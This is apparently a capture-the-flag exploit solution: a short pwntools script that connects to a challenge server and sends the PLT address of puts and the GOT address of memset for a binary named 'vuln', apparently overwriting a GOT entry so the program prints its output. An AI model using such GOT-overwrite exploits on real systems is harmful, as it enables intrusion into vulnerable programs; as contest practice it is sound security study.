from pwn import *

file = ELF("./vuln")
conn = remote("chal.imaginaryctf.org", 8091)

conn.recvline()
conn.sendline(str(file.plt.puts).encode())
conn.recvline()
conn.sendline(str(file.got.memset).encode())
print(conn.recvline().decode())
conn.close()
